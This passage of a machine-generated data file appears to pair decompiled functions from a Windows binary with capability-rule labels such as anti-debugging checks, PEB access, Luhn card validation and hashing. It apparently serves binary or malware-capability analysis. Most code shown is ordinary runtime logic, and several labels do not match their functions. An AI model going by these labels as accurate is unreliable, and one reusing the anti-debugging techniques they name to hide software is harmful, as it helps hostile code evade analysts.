= (**(in_EAX[1] + 8))();\n    iStack40 = iStack56;\n    piStack36 = in_EAX + 8;\n    for (iStack52 = 0; iStack52 < *(iVar7 + 0x78); iStack52 = iStack52 + 1) {\n        iVar1 = *piStack36;\n        iStack40 = iStack40 / iVar1;\n        if (0 < iVar1) {\n            do {\n                iVar7 = iVar1 + -1;\n                uVar2 = fcn.00437590(iVar7);\n                piStack36 = piStack32;\n                for (iVar6 = iStack52 * iStack40; iVar6 < iVar4; iVar6 = iVar6 + iVar1) {\n                    iVar5 = 0;\n                    if (0 < iStack40) {\n                        do {\n                            puVar8 = *piStack32 + iVar6 + iVar5;\n                            iVar5 = iVar5 + 1;\n                            *puVar8 = uVar2;\n                        } while (iVar5 < iStack40);\n                    }\n                }\n                iStack52 = iStack52 + 1;\n            } while (iStack52 < 0);\n        }\n        piStack36 = piStack36 + 1;\n    }\n    in_EAX[4] = iVar4;\n    in_EAX[5] = iStack56;\n    return;\n}\n",
        "token_count": 652
    },
    "004478b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004478b0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    char *pcVar2;\n    char *pcVar4;\n    char *pcVar5;\n    char *pcVar3;\n    \n    pcVar4 = *(in_EAX + 0x34) + *(in_EAX + 0x68);\n    pcVar5 = *(in_EAX + 0x34) + param_2;\n    if ((*pcVar5 == *pcVar4) && (pcVar5[1] == pcVar4[1])) {\n        pcVar5 = pcVar5 + 2;\n        pcVar3 = pcVar4 + 2;\n        while (((((pcVar2 = pcVar3 + 1,  *pcVar2 == pcVar5[1] && (pcVar2 = pcVar3 + 2,  *pcVar2 == pcVar5[2])) &&\n                 (pcVar2 = pcVar3 + 3,  *pcVar2 == pcVar5[3])) &&\n                ((pcVar2 = pcVar3 + 4,  *pcVar2 == pcVar5[4] && (pcVar2 = pcVar3 + 5,  *pcVar2 == pcVar5[5])))) &&\n               ((pcVar2 = pcVar3 + 6,  *pcVar2 == pcVar5[6] && (pcVar2 = pcVar3 + 7,  *pcVar2 == pcVar5[7]))))) {\n            pcVar2 = pcVar3 + 8;\n            pcVar5 = pcVar5 + 8;\n            if ((*pcVar2 != *pcVar5) || (pcVar3 = pcVar2,  pcVar4 + 0x102 <= pcVar2)) break;\n        }\n        uVar1 = 0x102 - ((pcVar4 + 0x102) - pcVar2);\n        if (uVar1 < 3) {\n            uVar1 = 2;\n        }\n        else {\n            *(in_EAX + 0x6c) = param_2;\n            if (*(in_EAX + 0x70) < uVar1) {\n                uVar1 = *(in_EAX + 0x70);\n            }\n        }\n    }\n    else {\n        uVar1 = 2;\n    }\n    return uVar1;\n}\n",
        "token_count": 541
    },
    "004629b8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.004629b8(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_5h;\n    \n    puStack32 = 0x4629cf;\n    iVar1 = fcn.00462d98();\n    if (iVar1 == 0) {\n        return;\n    }\n    puStack32 = 0x4629e3;\n    iVar1 = fcn.00404610();\n    puStack32 = 0x4629ee;\n    fcn.004628b4();\n    uStack36 = 0x462aa6;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    iVar2 = fcn.00462d98();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.00462d5c();\n            if (*(iVar3 + 0x5b) - 3U < 2) {\n                fcn.00462d5c();\n                fcn.004194b8();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.0040483c();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x462aad;\n    while (0 < *(iVar1 + 8)) {\n        uStack36 = 0x462a60;\n        iVar2 = fcn.00419610();\n        if (*(iVar2 + 0x5b) == '\\x03') {\n            uStack36 = 0x462a71;\n            fcn.0045e2c8();\n        }\n        else {\n            uStack36 = 0x462a7c;\n            fcn.0045e2c8();\n        }\n        uStack36 = 0x462a8b;\n        fcn.00419504();\n    }\n    uStack36 = 0x462a9d;\n    fcn.00404640();\n    uStack36 = 0x462aa5;\n    fcn.004628bc();\n    return;\n}\n",
        "token_count": 512
    },
    "0048c208": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.0048c208(void)\n\n{\n    int32_t iVar1;\n    uchar auStack12 [8];\n    \n    iVar1 = sub.kernel32.dll_GetLocaleInfoA_1(0x400, 0x5a, auStack12, 5);\n    if (iVar1 == 3) {\n        fcn.00405664();\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "00405258": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid fcn.00405258(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar2 = 0x10;\n    iVar1 = *0x4a1000;\n    do {\n        \"Runtime error     at 00000000\"[uVar2 & 0xff] = iVar1 % 10 + '0';\n        iVar1 = iVar1 / 10;\n        uVar2 = uVar2 - 1;\n    } while (iVar1 != 0);\n    uVar3 = 0x1c;\n    uVar2 = *0x4a1004;\n    do {\n        \"Runtime error     at 00000000\"[uVar3 & 0xff] = str.0123456789ABCDEF[uVar2 & 0xf];\n        uVar2 = uVar2 / 0x10;\n        uVar3 = uVar3 - 1;\n    } while (uVar2 != 0);\n    return;\n}\n",
        "token_count": 225
    },
    "00409c36": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409c36(uint param_1, uint32_t param_2)\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    uint32_t in_EAX;\n    uint8_t uVar3;\n    int32_t iVar5;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar6;\n    char cVar4;\n    \n    puVar6 = unaff_ESI;\n    do {\n        uVar1 = in_EAX;\n        in_EAX = in_EAX / 10;\n        puVar6 = puVar6 + -1;\n        cVar4 = uVar1 % 10;\n        uVar3 = cVar4 + 0x30;\n        if (0x39 < uVar3) {\n            uVar3 = cVar4 + 0x37;\n        }\n        *puVar6 = uVar3;\n    } while (in_EAX != 0);\n    iVar5 = param_2 - (unaff_ESI - puVar6);\n    if (unaff_ESI - puVar6 <= param_2 && iVar5 != 0) {\n        iVar2 = -iVar5;\n        while (iVar5 = iVar5 + -1,  iVar5 != 0) {\n            (puVar6 + iVar2)[iVar5] = 0x30;\n        }\n        puVar6[iVar2] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 317
    },
    "0040af84": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040af84(int32_t param_1, uint32_t param_2)\n\n{\n    char cVar2;\n    uint in_EAX;\n    uint32_t uVar1;\n    char unaff_BL;\n    uint32_t *puVar3;\n    uchar *unaff_EDI;\n    char *pcVar4;\n    uint32_t uStack8;\n    \n    *unaff_EDI = in_EAX;\n    if (unaff_BL == '\\0') {\n        param_2 = 0;\ncode_r0x0040af9a:\n        cVar2 = in_EAX >> 8;\n        pcVar4 = unaff_EDI + 1;\n        if (cVar2 == '\\0') goto code_r0x0040afa1;\n    }\n    else {\n        if (-1 < param_2) goto code_r0x0040af9a;\n        cVar2 = '-';\n        param_2 = -param_2;\n    }\n    pcVar4 = unaff_EDI + 2;\n    unaff_EDI[1] = cVar2;\ncode_r0x0040afa1:\n    puVar3 = &uStack8;\n    uStack8 = param_2;\n    do {\n        do {\n            uVar1 = param_2 / *0x4a1894;\n            *puVar3 = param_2 % *0x4a1894 + '0';\n            puVar3 = puVar3 + 1;\n            param_1 = param_1 + -1;\n            param_2 = uVar1;\n        } while (uVar1 != 0);\n    } while (0 < param_1);\n    do {\n        puVar3 = puVar3 + -1;\n        *pcVar4 = *puVar3;\n        pcVar4 = pcVar4 + 1;\n    } while (puVar3 != &uStack8);\n    return uStack8;\n}\n",
        "token_count": 425
    },
    "0040b3eb": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b3eb(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint8_t uVar7;\n    uint16_t uVar4;\n    int16_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar8;\n    uint8_t uVar9;\n    uint32_t uVar10;\n    int16_t *unaff_EBX;\n    int32_t unaff_EBP;\n    uint32_t *unaff_ESI;\n    int32_t iVar11;\n    int16_t *piVar12;\n    int16_t *piVar13;\n    bool bVar14;\n    float10 fVar15;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    uVar6 = *unaff_ESI;\n    uVar10 = unaff_ESI[1];\n    if ((uVar6 | uVar10) != 0) {\n        if (uVar10 < 0) {\n            bVar14 = uVar6 != 0;\n            uVar6 = -uVar6;\n            uVar10 = -bVar14 - uVar10;\n        }\n        iVar8 = 0;\n        iVar11 = *(unaff_EBP + 8);\n        if (iVar11 < 0) {\n            iVar11 = 0;\n        }\n        if (3 < iVar11) {\n            iVar11 = 4;\n            uVar2 = uVar6;\n            iVar3 = iVar8;\n            do {\n                iVar8 = iVar3;\n                uVar6 = uVar2;\n                bVar14 = 0xde0b6b2 < uVar10;\n                uVar1 = uVar10 + 0xf21f494d;\n                uVar10 = uVar1 - (uVar6 < 0xa7640000);\n                uVar2 = uVar6 + 0x589c0000;\n                iVar3 = iVar8 + 1;\n            } while (bVar14 && (uVar6 < 0xa7640000) <= uVar1);\n            uVar10 = uVar10 + 0xde0b6b3 + (0x589bffff < uVar6 + 0x589c0000);\n        }\n        *(unaff_EBP + -0x20) = uVar6;\n        *(unaff_EBP + -0x1c) = uVar10;\n        fVar15 = *(unaff_EBP + -0x20);\n        if (4 - iVar11 != 0) {\n            fVar15 = fVar15 / *(*(unaff_EBP + -4) + 0x40b3d7 + (4 - iVar11) * 4);\n        }\n        *(unaff_EBP + -0x18) = fVar15;\n        piVar12 = unaff_EBX + 3;\n        if (iVar8 != 0) {\n            piVar13 = unaff_EBX + 2;\n            *piVar12 = iVar8 + '0';\n            iVar8 = 9;\n            goto code_r0x0040b482;\n        }\n        iVar8 = 9;\n        do {\n            uVar9 = *(iVar8 + -0x19 + unaff_EBP);\n            uVar4 = CONCAT11(uVar9, uVar9 >> 4);\n            piVar13 = piVar12;\n            if (uVar9 >> 4 != 0) goto code_r0x0040b48b;\n            uVar7 = uVar4 >> 8;\n            if ((uVar9 & 0xf) != 0) goto code_r0x0040b492;\n            iVar8 = iVar8 + -1;\n        } while (iVar8 != 0);\n    }\n    iVar5 = 0;\n    uVar9 = 0;\n    *(unaff_EBX + 3) = 0;\ncode_r0x0040b4b8:\n    *unaff_EBX = iVar5;\n    *(unaff_EBX + 1) = uVar9;\n    return;\ncode_r0x0040b492:\n    while( true ) {\n        piVar13 = piVar12 + 1;\n        *piVar12 = (uVar7 & 0xf) + 0x30;\n        iVar8 = iVar8 + -1;\n        if (iVar8 == 0) break;\ncode_r0x0040b482:\n        uVar9 = *(iVar8 + -0x19 + unaff_EBP);\n        uVar4 = CONCAT11(uVar9, uVar9 >> 4);\ncode_r0x0040b48b:\n        uVar7 = uVar4 >> 8;\n        piVar12 = piVar13 + 1;\n        *piVar13 = uVar4 + '0';\n    }\n    iVar5 = piVar13 - (unaff_EBX + 3 + iVar11);\n    do {\n        *piVar13 = '\\0';\n        piVar13 = piVar13 + -1;\n    } while (*piVar13 == '0');\n    uVar9 = unaff_ESI[1] >> 0x1f;\n    goto code_r0x0040b4b8;\n}\n",
        "token_count": 1158
    },
    "0047a59c": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0047a59c(void)\n\n{\n    fcn.0040f840();\n    return;\n}\n",
        "token_count": 26
    },
    "0040a6b8": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040a6b8(uint arg_8h, uint arg_ch)\n\n{\n    uint var_12h;\n    int16_t var_eh;\n    int16_t var_ch;\n    uint var_ah;\n    uint16_t var_6h;\n    uint var_4h;\n    \n    fcn.0040badc(arg_8h, arg_ch);\n    if ((var_6h < 0x7bc) || (0x83b < var_6h)) {\n        var_4h = 0;\n    }\n    else {\n        fcn.0040b7fc(&var_12h, arg_8h, arg_ch);\n        var_4h = CONCAT22(var_ah._2_2_ << 5 | var_ah | (var_6h - 0x7bc) * 0x200, \n                          var_12h._2_2_ >> 1 | var_eh << 5 | var_ch << 0xb);\n    }\n    return var_4h;\n}\n",
        "token_count": 240
    },
    "00419b14": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00419b14(int32_t param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    bool bVar4;\n    int32_t iStack16;\n    \n    iVar1 = *(in_EAX + 4) + 0x1f;\n    if (iVar1 < 0) {\n        iVar1 = *(in_EAX + 4) + 0x3e;\n    }\n    iStack16 = param_1;\n    if (-1 < (iVar1 >> 5) + -1) {\n        iVar3 = 0;\n        iStack16 = iVar1 >> 5;\n        do {\n            if (*0x419b88 != *(*(in_EAX + 8) + iVar3 * 4)) {\n                uVar2 = 0;\n                do {\n                    bVar4 = uVar2 < 0x1f;\n                    if (uVar2 < 0x20) {\n                        bVar4 = (*(*(in_EAX + 8) + iVar3 * 4) >> (uVar2 & 0x1f) & 1) != 0;\n                    }\n                    if (!bVar4) {\n                        iVar1 = iVar3 * 0x20 + (uVar2 & 0x7f);\n                        if (*(in_EAX + 4) <= iVar1) {\n                            iVar1 = *(in_EAX + 4);\n                        }\n                        goto code_r0x00419b80;\n                    }\n                    uVar2 = uVar2 + 1;\n                } while (uVar2 != ' ');\n            }\n            iVar3 = iVar3 + 1;\n            iStack16 = iStack16 + -1;\n        } while (iStack16 != 0);\n    }\n    iVar1 = *(in_EAX + 4);\ncode_r0x00419b80:\n    return CONCAT44(iStack16, iVar1);\n}\n",
        "token_count": 434
    },
    "00430c30": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00430c30(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    \n    uVar3 = in_EAX[1];\n    uVar4 = in_EAX[2];\n    uVar1 = in_EAX[3];\n    uVar2 = *in_EAX + *param_2 + *0x4a2038 + ((uVar1 ^ uVar4) & uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x80 | uVar2 >> 0x19) + uVar3;\n    uVar1 = uVar1 + param_2[1] + *0x4a203c + ((uVar4 ^ uVar3) & uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x1000 | uVar1 >> 0x14) + uVar2;\n    uVar4 = uVar4 + param_2[2] + *0x4a2040 + ((uVar3 ^ uVar2) & uVar1 ^ uVar3);\n    uVar5 = (uVar4 * 0x20000 | uVar4 >> 0xf) + uVar1;\n    uVar3 = uVar3 + param_2[3] + *0x4a2044 + ((uVar2 ^ uVar1) & uVar5 ^ uVar2);\n    uVar6 = (uVar3 * 0x400000 | uVar3 >> 10) + uVar5;\n    uVar2 = uVar2 + param_2[4] + *0x4a2048 + ((uVar1 ^ uVar5) & uVar6 ^ uVar1);\n    uVar4 = (uVar2 * 0x80 | uVar2 >> 0x19) + uVar6;\n    uVar1 = uVar1 + param_2[5] + *0x4a204c + ((uVar5 ^ uVar6) & uVar4 ^ uVar5);\n    uVar3 = (uVar1 * 0x1000 | uVar1 >> 0x14) + uVar4;\n    uVar5 = uVar5 + param_2[6] + *0x4a2050 + ((uVar6 ^ uVar4) & uVar3 ^ uVar6);\n    uVar2 = (uVar5 * 0x20000 | uVar5 >> 0xf) + uVar3;\n    uVar6 = uVar6 + param_2[7] + *0x4a2054 + ((uVar4 ^ uVar3) & uVar2 ^ uVar4);\n    uVar1 = (uVar6 * 0x400000 | uVar6 >> 10) + uVar2;\n    uVar4 = uVar4 + param_2[8] + *0x4a2058 + ((uVar3 ^ uVar2) & uVar1 ^ uVar3);\n    uVar4 = (uVar4 * 0x80 | uVar4 >> 0x19) + uVar1;\n    uVar3 = uVar3 + param_2[9] + *0x4a205c + ((uVar2 ^ uVar1) & uVar4 ^ uVar2);\n    uVar3 = (uVar3 * 0x1000 | uVar3 >> 0x14) + uVar4;\n    uVar2 = uVar2 + param_2[10] + *0x4a2060 + ((uVar1 ^ uVar4) & uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x20000 | uVar2 >> 0xf) + uVar3;\n    uVar1 = uVar1 + param_2[0xb] + *0x4a2064 + ((uVar4 ^ uVar3) & uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x400000 | uVar1 >> 10) + uVar2;\n    uVar4 = uVar4 + param_2[0xc] + *0x4a2068 + ((uVar3 ^ uVar2) & uVar1 ^ uVar3);\n    uVar4 = (uVar4 * 0x80 | uVar4 >> 0x19) + uVar1;\n    uVar3 = uVar3 + param_2[0xd] + *0x4a206c + ((uVar2 ^ uVar1) & uVar4 ^ uVar2);\n    uVar3 = (uVar3 * 0x1000 | uVar3 >> 0x14) + uVar4;\n    uVar2 = uVar2 + param_2[0xe] + *0x4a2070 + ((uVar1 ^ uVar4) & uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x20000 | uVar2 >> 0xf) + uVar3;\n    uVar1 = uVar1 + param_2[0xf] + *0x4a2074 + ((uVar4 ^ uVar3) & uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x400000 | uVar1 >> 10) + uVar2;\n    uVar4 = uVar4 + param_2[1] + *0x4a2078 + ((uVar2 ^ uVar1) & uVar3 ^ uVar2);\n    uVar4 = (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar1;\n    uVar3 = uVar3 + param_2[6] + *0x4a207c + ((uVar1 ^ uVar4) & uVar2 ^ uVar1);\n    uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar4;\n    uVar2 = uVar2 + param_2[0xb] + str.QZ._0_4_ + ((uVar4 ^ uVar3) & uVar1 ^ uVar4);\n    uVar2 = (uVar2 * 0x4000 | uVar2 >> 0x12) + uVar3;\n    uVar1 = uVar1 + *param_2 + *0x4a2084 + ((uVar3 ^ uVar2) & uVar4 ^ uVar3);\n    uVar1 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar2;\n    uVar4 = uVar4 + param_2[5] + *0x4a2088 + ((uVar2 ^ uVar1) & uVar3 ^ uVar2);\n    uVar4 = (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar1;\n    uVar3 = uVar3 + param_2[10] + *0x4a208c + ((uVar1 ^ uVar4) & uVar2 ^ uVar1);\n    uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar4;\n    uVar2 = uVar2 + param_2[0xf] + *0x4a2090 + ((uVar4 ^ uVar3) & uVar1 ^ uVar4);\n    uVar2 = (uVar2 * 0x4000 | uVar2 >> 0x12) + uVar3;\n    uVar1 = uVar1 + param_2[4] + *0x4a2094 + ((uVar3 ^ uVar2) & uVar4 ^ uVar3);\n    uVar1 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar2;\n    uVar4 = uVar4 + param_2[9] + *0x4a2098 + ((uVar2 ^ uVar1) & uVar3 ^ uVar2);\n    uVar4 = (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar1;\n    uVar3 = uVar3 + param_2[0xe] + *0x4a209c + ((uVar1 ^ uVar4) & uVar2 ^ uVar1);\n    uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar4;\n    uVar2 = uVar2 + param_2[3] + *0x4a20a0 + ((uVar4 ^ uVar3) & uVar1 ^ uVar4);\n    uVar2 = (uVar2 * 0x4000 | uVar2 >> 0x12) + uVar3;\n    uVar1 = uVar1 + param_2[8] + *0x4a20a4 + ((uVar3 ^ uVar2) & uVar4 ^ uVar3);\n    uVar1 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar2;\n    uVar4 = uVar4 + param_2[0xd] + *0x4a20a8 + ((uVar2 ^ uVar1) & uVar3 ^ uVar2);\n    uVar4 = (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar1;\n    uVar3 = uVar3 + param_2[2] + *0x4a20ac + ((uVar1 ^ uVar4) & uVar2 ^ uVar1);\n    uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar4;\n    uVar2 = uVar2 + param_2[7] + *0x4a20b0 + ((uVar4 ^ uVar3) & uVar1 ^ uVar4);\n    uVar2 = (uVar2 * 0x4000 | uVar2 >> 0x12) + uVar3;\n    uVar1 = uVar1 + param_2[0xc] + *0x4a20b4 + ((uVar3 ^ uVar2) & uVar4 ^ uVar3);\n    uVar1 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar2;\n    uVar4 = uVar4 + param_2[5] + *0x4a20b8 + (uVar2 ^ uVar1 ^ uVar3);\n    uVar4 = (uVar4 * 0x10 | uVar4 >> 0x1c) + uVar1;\n    uVar3 = uVar3 + param_2[8] + *0x4a20bc + (uVar1 ^ uVar4 ^ uVar2);\n    uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar4;\n    uVar2 = uVar2 + param_2[0xb] + *0x4a20c0 + (uVar4 ^ uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x10000 | uVar2 >> 0x10) + uVar3;\n    uVar1 = uVar1 + param_2[0xe] + *0x4a20c4 + (uVar3 ^ uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar2;\n    uVar4 = uVar4 + param_2[1] + *0x4a20c8 + (uVar2 ^ uVar1 ^ uVar3);\n    uVar4 = (uVar4 * 0x10 | uVar4 >> 0x1c) + uVar1;\n    uVar3 = uVar3 + param_2[4] + *0x4a20cc + (uVar1 ^ uVar4 ^ uVar2);\n    uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar4;\n    uVar2 = uVar2 + param_2[7] + *0x4a20d0 + (uVar4 ^ uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x10000 | uVar2 >> 0x10) + uVar3;\n    uVar1 = uVar1 + param_2[10] + *0x4a20d4 + (uVar3 ^ uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar2;\n    uVar4 = uVar4 + param_2[0xd] + *0x4a20d8 + (uVar2 ^ uVar1 ^ uVar3);\n    uVar4 = (uVar4 * 0x10 | uVar4 >> 0x1c) + uVar1;\n    uVar3 = uVar3 + *param_2 + *0x4a20dc + (uVar1 ^ uVar4 ^ uVar2);\n    uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar4;\n    uVar2 = uVar2 + param_2[3] + *0x4a20e0 + (uVar4 ^ uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x10000 | uVar2 >> 0x10) + uVar3;\n    uVar1 = uVar1 + param_2[6] + *0x4a20e4 + (uVar3 ^ uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar2;\n    uVar4 = uVar4 + param_2[9] + *0x4a20e8 + (uVar2 ^ uVar1 ^ uVar3);\n    uVar4 = (uVar4 * 0x10 | uVar4 >> 0x1c) + uVar1;\n    uVar3 = uVar3 + param_2[0xc] + *0x4a20ec + (uVar1 ^ uVar4 ^ uVar2);\n    uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar4;\n    uVar2 = uVar2 + param_2[0xf] + *0x4a20f0 + (uVar4 ^ uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x10000 | uVar2 >> 0x10) + uVar3;\n    uVar1 = uVar1 + param_2[2] + *0x4a20f4 + (uVar3 ^ uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar2;\n    uVar4 = uVar4 + *param_2 + *0x4a20f8 + ((~uVar3 | uVar1) ^ uVar2);\n    uVar4 = (uVar4 * 0x40 | uVar4 >> 0x1a) + uVar1;\n    uVar3 = uVar3 + param_2[7] + *0x4a20fc + ((~uVar2 | uVar4) ^ uVar1);\n    uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar4;\n    uVar2 = uVar2 + param_2[0xe] + *0x4a2100 + ((~uVar1 | uVar3) ^ uVar4);\n    uVar2 = (uVar2 * 0x8000 | uVar2 >> 0x11) + uVar3;\n    uVar1 = uVar1 + param_2[5] + *0x4a2104 + ((~uVar4 | uVar2) ^ uVar3);\n    uVar1 = (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar2;\n    uVar4 = uVar4 + param_2[0xc] + *0x4a2108 + ((~uVar3 | uVar1) ^ uVar2);\n    uVar4 = (uVar4 * 0x40 | uVar4 >> 0x1a) + uVar1;\n    uVar3 = uVar3 + param_2[3] + *0x4a210c + ((~uVar2 | uVar4) ^ uVar1);\n    uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar4;\n    uVar2 = uVar2 + param_2[10] + *0x4a2110 + ((~uVar1 | uVar3) ^ uVar4);\n    uVar2 = (uVar2 * 0x8000 | uVar2 >> 0x11) + uVar3;\n    uVar1 = uVar1 + param_2[1] + *0x4a2114 + ((~uVar4 | uVar2) ^ uVar3);\n    uVar1 = (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar2;\n    uVar4 = uVar4 + param_2[8] + *0x4a2118 + ((~uVar3 | uVar1) ^ uVar2);\n    uVar4 = (uVar4 * 0x40 | uVar4 >> 0x1a) + uVar1;\n    uVar3 = uVar3 + param_2[0xf] + *0x4a211c + ((~uVar2 | uVar4) ^ uVar1);\n    uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar4;\n    uVar2 = uVar2 + param_2[6] + *0x4a2120 + ((~uVar1 | uVar3) ^ uVar4);\n    uVar2 = (uVar2 * 0x8000 | uVar2 >> 0x11) + uVar3;\n    uVar1 = uVar1 + param_2[0xd] + *0x4a2124 + ((~uVar4 | uVar2) ^ uVar3);\n    uVar1 = (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar2;\n    uVar4 = uVar4 + param_2[4] + *0x4a2128 + ((~uVar3 | uVar1) ^ uVar2);\n    uVar4 = (uVar4 * 0x40 | uVar4 >> 0x1a) + uVar1;\n    uVar3 = uVar3 + param_2[0xb] + *0x4a212c + ((~uVar2 | uVar4) ^ uVar1);\n    uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar4;\n    uVar2 = uVar2 + param_2[2] + *0x4a2130 + ((~uVar1 | uVar3) ^ uVar4);\n    uVar2 = (uVar2 * 0x8000 | uVar2 >> 0x11) + uVar3;\n    uVar1 = uVar1 + param_2[9] + *0x4a2134 + ((~uVar4 | uVar2) ^ uVar3);\n    *in_EAX = *in_EAX + uVar4;\n    in_EAX[1] = in_EAX[1] + (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar2;\n    in_EAX[2] = in_EAX[2] + uVar2;\n    in_EAX[3] = in_EAX[3] + uVar3;\n    return;\n}\n",
        "token_count": 4651
    },
    "00438588": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00438588(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    int32_t in_EDX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_ECX < arg_8h) {\n        do {\n            if (arg_8h < in_ECX * 2) {\n                piVar1 = fcn.00438190();\n            }\n            else {\n                piVar1 = fcn.00438164();\n            }\n            if (piVar1 == NULL) {\n                return in_ECX;\n            }\n            piVar5 = in_ECX * 0x20 + in_EDX;\n            piVar5[1] = piVar1[1];\n            piVar5[3] = piVar1[3];\n            piVar5[5] = piVar1[5];\n            *piVar5 = *piVar1;\n            piVar5[2] = piVar1[2];\n            piVar5[4] = piVar1[4];\n            iVar3 = (piVar1[3] - piVar1[2]) * 0xc;\n            iVar4 = (piVar1[5] - piVar1[4]) * 0x10;\n            iVar2 = 1;\n            if (iVar3 < iVar4) {\n                iVar2 = 2;\n                iVar3 = iVar4;\n            }\n            if (iVar3 < (piVar1[1] - *piVar1) * 8) {\n                iVar2 = 0;\n            }\n            if (iVar2 == 0) {\n          